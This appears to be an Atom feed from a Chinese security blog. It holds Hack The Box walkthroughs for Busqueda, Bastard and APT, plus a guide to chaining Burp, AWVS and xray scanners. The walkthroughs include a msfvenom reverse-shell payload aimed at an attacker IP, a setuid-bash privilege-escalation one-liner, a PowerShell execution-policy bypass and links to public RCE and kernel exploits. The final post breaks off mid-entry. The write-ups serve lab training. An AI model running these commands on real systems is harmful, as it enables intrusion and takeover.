<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2023-07-14T09:35:44.355Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>htb打靶-Busqueda</title>
    <link href="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/"/>
    <id>https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/</id>
    <published>2023-07-14T05:58:40.000Z</published>
    <updated>2023-07-14T09:35:44.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>拿到靶机ip先nmap扫描下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png" alt="image-20230714141955637"></p><p>开放80 22 看下web,输入ip跳转到这个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141420082.png" alt="image-20230714142038037"></p><p>添加下域名解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141421710.png" alt="image-20230714142152680"></p><p>正常访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141423784.png" alt="image-20230714142321734"></p><p>大致意思是,输入搜索内容,随便输入,返回url</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141425877.png" alt="image-20230714142547846"></p><p>跳转到一个新的网站,没什么用,扫下目录,没发现东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141430225.png" alt="image-20230714143016191"></p><p>探测下cms,flask的一个框架</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141434247.png" alt="image-20230714143430215"></p><p>网站首页下方</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141435278.png" alt="image-20230714143536245"></p><p>寻找exp,找到一个利用<a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a> 一个rce</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>一发入魂,返回shell,这里ip是自己攻击机的ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141445541.png" alt="image-20230714144549508"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141446056.png" alt="image-20230714144612028"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l,因为是反弹的shell,需要加-S,提示我们要密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141650653.png" alt="image-20230714165010614"></p><p>找到一个隐藏目录,在config文件中撞出密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141653662.png" alt="image-20230714165352629"></p><p>找到一个sui权限的python文件,但是没有查看权限,通过名字可以得知是系统检查</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141655480.png" alt="image-20230714165556425"></p><p>反弹的shell不太方便,直接ssh上去,运行这个脚本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141704830.png" alt="image-20230714170436776"></p><p>提示需要参数,带入参数执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141709406.png" alt="image-20230714170908350"></p><p>参数名和当前目录下一个文件名相同,有可能是调用了这个full-check.sh文件,我们创建一个自己的full-checkup.sh试试,切换到tmp目录,但是在执行的时候一直报错,文件会被删除</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141720958.png" alt="image-20230714172000899"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> full-checkup.sh&amp;&amp;<span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; full-checkup.sh&amp;&amp;<span class="built_in">chmod</span> +x full-checkup.sh&amp;&amp;sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;拿到靶机ip先nmap扫描下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png&quot; alt=&quot;image-20230714141955637&quot;&gt;&lt;/p&gt;
&lt;p&gt;开放80 22 看下web,输入ip跳转到这个域名&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307141420082.png&quot; alt=&quot;image-20230714142038037&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>联动套娃挖洞bp+awvs+xray</title>
    <link href="https://syst1m.top/2023/07/06/%E8%81%94%E5%8A%A8%E5%A5%97%E5%A8%83%E6%8C%96%E6%B4%9Ebp-awvs-xray/"/>
    <id>https://syst1m.top/2023/07/06/%E8%81%94%E5%8A%A8%E5%A5%97%E5%A8%83%E6%8C%96%E6%B4%9Ebp-awvs-xray/</id>
    <published>2023-07-06T08:28:12.000Z</published>
    <updated>2023-07-07T02:40:52.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burp-配置"><a href="#burp-配置" class="headerlink" title="burp 配置"></a>burp 配置</h1><h2 id="第一层代理配置"><a href="#第一层代理配置" class="headerlink" title="第一层代理配置"></a>第一层代理配置</h2><p>awvs的流量会经过这里</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061702308.png" alt="image-20230706170206267"></p><h2 id="第二层代理配置"><a href="#第二层代理配置" class="headerlink" title="第二层代理配置"></a>第二层代理配置</h2><p>流量会经过burp后转发给xray</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061707728.png" alt="image-20230706170720687"></p><h1 id="xray-配置"><a href="#xray-配置" class="headerlink" title="xray 配置"></a>xray 配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_arm64 webscan --listen 127.0.0.1:7777 --html-output ./out/vul.html       </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061709083.png" alt="image-20230706170937042"></p><h1 id="AWVS配置"><a href="#AWVS配置" class="headerlink" title="AWVS配置"></a>AWVS配置</h1><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>我这里使用docker起的一个Awvs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">docker run -it -d -p 13443:3443 --cap-add LINUX_IMMUTABLE secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">Then visit https://YOUR_IP:13443/ <span class="comment"># 这里访问要加https才可以访问</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061633280.png" alt="image-20230706163316215"></p><h2 id="生成apikey"><a href="#生成apikey" class="headerlink" title="生成apikey"></a>生成apikey</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061639410.png" alt="image-20230706163928380"></p><h2 id="脚本批量导入"><a href="#脚本批量导入" class="headerlink" title="脚本批量导入"></a>脚本批量导入</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">apikey = <span class="string">&#x27;1986ad8c0a5b3df4d7...&#x27;</span>  <span class="comment"># API</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&quot;X-Auth&quot;</span>: apikey&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addTask</span>(<span class="params">url, target</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/targets/add&#x27;</span>))</span><br><span class="line">        data = &#123;<span class="string">&quot;targets&quot;</span>: [&#123;<span class="string">&quot;address&quot;</span>: target, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>&#125;], <span class="string">&quot;groups&quot;</span>: []&#125;</span><br><span class="line">        r = requests.post(url, headers=headers, data=json.dumps(data), timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        result = json.loads(r.content.decode())</span><br><span class="line">        <span class="keyword">return</span> result[<span class="string">&#x27;targets&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">url, target, Crawl, user_agent, profile_id, proxy_address, proxy_port</span>):</span><br><span class="line">    scanUrl = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/scans&#x27;</span>))</span><br><span class="line">    target_id = addTask(url, target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_id:</span><br><span class="line">        data = &#123;<span class="string">&quot;target_id&quot;</span>: target_id, <span class="string">&quot;profile_id&quot;</span>: profile_id, <span class="string">&quot;incremental&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;schedule&quot;</span>: &#123;<span class="string">&quot;disable&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;start_date&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;time_sensitive&quot;</span>: <span class="literal">False</span>&#125;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            configuration(url, target_id, proxy_address, proxy_port, Crawl, user_agent)</span><br><span class="line">            response = requests.post(scanUrl, data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            result = json.loads(response.content)</span><br><span class="line">            <span class="keyword">return</span> result[<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">configuration</span>(<span class="params">url, target_id, proxy_address, proxy_port, Crawl, user_agent</span>):</span><br><span class="line">    configuration_url = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/targets/&#123;0&#125;/configuration&#x27;</span>.<span class="built_in">format</span>(target_id)))</span><br><span class="line">    data = &#123;<span class="string">&quot;scan_speed&quot;</span>: <span class="string">&quot;fast&quot;</span>, <span class="string">&quot;login&quot;</span>: &#123;<span class="string">&quot;kind&quot;</span>: <span class="string">&quot;none&quot;</span>&#125;, <span class="string">&quot;ssh_credentials&quot;</span>: &#123;<span class="string">&quot;kind&quot;</span>: <span class="string">&quot;none&quot;</span>&#125;, <span class="string">&quot;sensor&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;user_agent&quot;</span>: user_agent, <span class="string">&quot;case_sensitive&quot;</span>: <span class="string">&quot;auto&quot;</span>, <span class="string">&quot;limit_crawler_scope&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;excluded_paths&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;authentication&quot;</span>: &#123;<span class="string">&quot;enabled&quot;</span>: <span class="literal">False</span>&#125;,</span><br><span class="line">            <span class="string">&quot;proxy&quot;</span>: &#123;<span class="string">&quot;enabled&quot;</span>: Crawl, <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;http&quot;</span>, <span class="string">&quot;address&quot;</span>: proxy_address, <span class="string">&quot;port&quot;</span>: proxy_port&#125;,</span><br><span class="line">            <span class="string">&quot;technologies&quot;</span>: [], <span class="string">&quot;custom_headers&quot;</span>: [], <span class="string">&quot;custom_cookies&quot;</span>: [], <span class="string">&quot;debug&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;client_certificate_password&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;issue_tracker_id&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;excluded_hours_id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">    r = requests.patch(url=configuration_url, data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Crawl = <span class="literal">True</span></span><br><span class="line">    proxy_address = <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="comment"># docker需要填写物理机ip</span></span><br><span class="line">    proxy_port = <span class="string">&#x27;8080&#x27;</span></span><br><span class="line">    awvs_url = <span class="string">&#x27;https://127.0.0.1:13443&#x27;</span>  <span class="comment"># awvs url</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;C:\x\x\url.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:        <span class="comment">#添加URL路径</span></span><br><span class="line">        targets = f.readlines()</span><br><span class="line">    profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111111&quot;</span></span><br><span class="line">    user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&quot;</span>  <span class="comment"># 扫描默认UA头</span></span><br><span class="line">    <span class="keyword">if</span> Crawl:</span><br><span class="line">        profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111117&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</span><br><span class="line">        target = target.strip()</span><br><span class="line">        <span class="keyword">if</span> scan(awvs_url, target, Crawl, user_agent, profile_id, proxy_address, <span class="built_in">int</span>(proxy_port)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; 添加成功&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="添加url"><a href="#添加url" class="headerlink" title="添加url"></a>添加url</h2><p>等待扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061658937.png" alt="image-20230706165826438"></p><p>开启捡洞模式</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307071039113.png" alt="image-20230707103924039"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307071040056.png" alt="image-20230707104013987"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;burp-配置&quot;&gt;&lt;a href=&quot;#burp-配置&quot; class=&quot;headerlink&quot; title=&quot;burp 配置&quot;&gt;&lt;/a&gt;burp 配置&lt;/h1&gt;&lt;h2 id=&quot;第一层代理配置&quot;&gt;&lt;a href=&quot;#第一层代理配置&quot; class=&quot;headerlink&quot; title=&quot;第一层代理配置&quot;&gt;&lt;/a&gt;第一层代理配置&lt;/h2&gt;&lt;p&gt;awvs的流量会经过这里&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307061702308.png&quot; alt=&quot;image-20230706170206267&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;第二层代理配置&quot;&gt;&lt;a href=&quot;#第二层代理配置&quot; class=&quot;headerlink&quot; title=&quot;第二层代理配置&quot;&gt;&lt;/a&gt;第二层代理配置&lt;/h2&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="漏洞挖掘" scheme="https://syst1m.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-Bastard</title>
    <link href="https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/"/>
    <id>https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/</id>
    <published>2023-07-03T03:17:09.000Z</published>
    <updated>2023-07-18T13:23:19.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -O 10.129.10.80          </span><br></pre></td></tr></table></figure><p>开放了80,135,重点显然是在web上面了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031137335.png" alt="image-20230703113702787"></p><p>查看首页,drupal cms<img src="https://raw.githubusercontent.com/chencicici/images/main/202307031138332.png" alt="image-20230703113853299"></p><p>google一下找到专用扫描器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/immunIT/drupwn</span><br></pre></td></tr></table></figure><p>给出了版本7.54但是发现扫不出,换工具!</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031307946.png" alt="image-20230703130700889"></p><h1 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h1><p>换searchsploit寻找nday</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031328547.png" alt="image-20230703132821489"></p><p>-m 编号,下载到当前目录,修改对应内容</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340928.png" alt="image-20230703134008900"></p><p>执行发现少一个扩展</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340450.png" alt="image-20230703134031415"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-curl</span><br></pre></td></tr></table></figure><p>发现利用不成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031349688.png" alt="image-20230703134905651"></p><p>google继续跟进这个exp,找到解释<a href="https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/">https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/</a></p><p>原来还需要找到这个路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031350600.png" alt="image-20230703135030563"></p><p>确认存在,修改exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031351923.png" alt="image-20230703135134883"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031352601.png" alt="image-20230703135208562"></p><p>利用成功,返回webshell路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031353934.png" alt="image-20230703135327900"></p><p>命令执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031354170.png" alt="image-20230703135422132"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>为了方便点可以先写个马上线蚁剑(重启后ip变了)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307181956174.png" alt="image-20230718195638106"></p><p>将靶机上线到msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182018619.png" alt="image-20230718201800576"></p><p>试了几个常用的提权模块,但是提不下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182036797.png" alt="image-20230718203628750"></p><p>下载提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rasta-mouse/Sherlock.git</span><br></pre></td></tr></table></figure><p>加载powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br></pre></td></tr></table></figure><p>导入powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_import <span class="string">&#x27;/root/Desktop/Sherlock/Sherlock.ps1&#x27;</span> <span class="comment"># 本地ps脚本路径</span></span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_execute “find-allvulns”</span><br></pre></td></tr></table></figure><p>或则直接上传上去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;&amp; &#123;Import-Module C:\inetpub\drupal-7.54\Sherlock.ps1;Find-AllVulns&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182059121.png" alt="image-20230718205948075"></p><p>下载exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip</span><br></pre></td></tr></table></figure><p>上传运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182114205.png" alt="image-20230718211429146"></p><p>用system权限去运行后门,返回一个会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182121208.png" alt="image-20230718212140152"></p><p>拿到flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182123915.png" alt="image-20230718212311870"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nmap -sV -sT -sC -O 10.129.10.80          &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;开放了80,135,重点显然是在web上面了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307031137335.png&quot; alt=&quot;image-20230703113702787&quot;&gt;&lt;/p&gt;
&lt;p&gt;查看首页,drupal cms&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307031138332.png&quot; alt=&quot;image-20230703113853299&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-apt</title>
    <link href="https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/"/>
    <id>https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/</id>
    <published>2023-06-07T02:33:24.000Z</published>
    <updated>2023-06-08T06:48:24.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>连接上vpn后的攻击机ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071038755.png" alt="image-20230607103822712"></p><p>ping一下测试靶机是否通</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071039707.png" alt="image-20230607103929681"></p><h2 id="nmap端口信息收集"><a href="#nmap端口信息收集" class="headerlink" title="nmap端口信息收集"></a>nmap端口信息收集</h2><p>同时进行tcp和udp的全端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -p- 10.129.96.60</span><br><span class="line">nmap --min-rate 10000 -p- -sU 10.129.96.60</span><br><span class="line">-sU <span class="comment">#udp扫描</span></span><br><span class="line">--min-rate <span class="comment"># 最小速率</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071052253.png" alt="image-20230607105207228"></p><p>扫描结果中没有udp端口,对tcp端口做进一步扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -p 135,80 -O 10.129.96.60</span><br><span class="line">-sC <span class="comment">#使用默认脚本</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071102490.png" alt="image-20230607110246463"></p><p>继续做漏洞脚本扫描,没东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071137113.png" alt="image-20230607113708075"></p><h2 id="web信息收集-无价值-可跳过"><a href="#web信息收集-无价值-可跳过" class="headerlink" title="web信息收集(无价值,可跳过)"></a>web信息收集(无价值,可跳过)</h2><p>访问80端口看看有没有突破口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071107269.png" alt="image-20230607110740223"></p><p>爆一下目录,没发现什么有价值的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.129.96.60 -w /usr/share/dirb/wordlists/common.txt -t 100</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071112242.png" alt="image-20230607111216208"></p><p>&#x2F;js访问403,继续翻找源码,在源码里找到两个关键信息</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.透露出一个<span class="built_in">ip</span> 但是无法访问</span><br><span class="line"><span class="number">2</span>.透露出这站是由 HTTrack Website Copier这个框架镜像出来的,那么我们对这个网站sql.xss测试都没有用</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081050835.png" alt="image-20230608105053578"></p><p>寻找 HTTrack Website Copier 的相关利用,翻译一下是一个堆栈利用漏洞,没用用处,因为无法直接操作这个应用,继续翻找其他漏洞,也都无法直接利用 </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081100364.png" 